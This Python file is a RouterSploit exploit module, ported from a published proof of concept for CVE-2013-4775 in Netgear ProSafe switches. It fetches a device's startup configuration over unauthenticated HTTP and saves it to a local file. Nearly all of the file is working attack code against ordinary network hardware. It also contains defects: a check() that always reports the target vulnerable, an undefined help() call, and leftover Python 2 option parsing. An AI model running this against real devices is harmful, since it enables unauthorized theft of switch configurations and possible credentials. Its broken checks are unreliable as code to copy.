#!/usr/bin/python

################################################################
#                                                              #
# Netgear ProSafe - CVE-2013-4775 PoC                          #
# written by Juan J. Guelfo @ Encripto AS                      #
# post@encripto.no                                             #
#                                                              #
# Copyright 2013 Encripto AS. All rights reserved.             #
#                                                              #
# This software is licensed under the FreeBSD license.         #
# http://www.encripto.no/tools/license.php                     #
#                                                              #
################################################################

import sys, getopt, urllib,urllib.request
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")

    port = OptPort(80, "Target HTTP port")




    __info__ = {

        "name": "CVE-2013-4775",
        "description": "Details of the vulnerability have not been disclosed ",
        "authors": (
            "Juan J. Guelfo, Encripto AS (post@encripto.no)",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/27774",
        ),
        "devices": (
            "CVE-2013-4775"
        ),

    }



    __version__ = "0.1"
    __author__ = "Juan J. Guelfo, Encripto AS (post@encripto.no)"
    output = 'output.txt'

    # Prints title and other header info
    def header(self):
        print("")
        print("=================================================================")
        print("|  Netgear ProSafe - CVE-2013-4775 PoC \t\t\t\t  |".format(self.__version__))
        print("|  by {0}\t\t  |".format(self.__author__))
        print("=================================================================")
        print("")

        
    # Prints help    
    def help(self):
        self.header()
        print_status("""
       Usage: python CVE-2013-4775.py [mandatory options]

       Mandatory options:
           -t target               ...Target IP address
           -p port                 ...Port where the HTTP admin interface is listening on
           -o file                 ...Output file where the config will be written to
            
       Example:
           python CVE-2013-4775.py -t 192.168.0.1 -p 80 -o output.txt
        """)
        #sys.exit(0) 
        
        
        
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
        
            #Parse options
            # try:
            #     options, args = getopt.getopt(sys.argv[1:], "t:p:o:", ["target=", "port=", "output="])

            # except getopt.GetoptError, err:
            #     self.header()
            #     print_status("\n[-] Error: {0}.\n".format(str(err)))
            #     #sys.exit(1)
            
            # if not options:
            #     self.help()
            
            # target = None
            # port = None
            # output = None
            # reset = None
            # for opt, arg in options:
            #     if opt in ("-t"):
            #         target = arg
                
            #     if opt in ("-p"):
            #         port = arg    
                    
            #     if opt in ("-o"):
            #         output = arg  
                    
            #Option input validation
            if self.target and self.port and self.output:
                print_status(" Trying to connect to {0}:{1}...".format(self.target, self.port))
                headers = { "User-Agent" : "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)" }

                try:
                    # Get the startup config via HTTP admin interface
                    r = urllib.request.Request("http://%s:%s/filesystem/startup-config" % (self.target, self.port), None, headers)
                    startup_config = urllib.request.urlopen(r).read()
                    print_status(" Connected...")
                    
                    # Write results to output file
                    print_status(" Writing startup config to {0}...\n".format(self.output))
                    fw = open(self.output, 'w')
                    fw.write(startup_config)
                    fw.close()
                
                except urllib.error.URLError:
                    print_error(" Error: The connection could not be established.\n")
                    
                except IOError as e:
                    print_error(" Error: {0}...\n".format(e.strerror))
                    #sys.exit(1)
            else:
                help()
                print_error(" Error: Incorrect syntax.\n")
            
            #header()
            

            #sys.exit(0)
    def check(self):
        
        return True
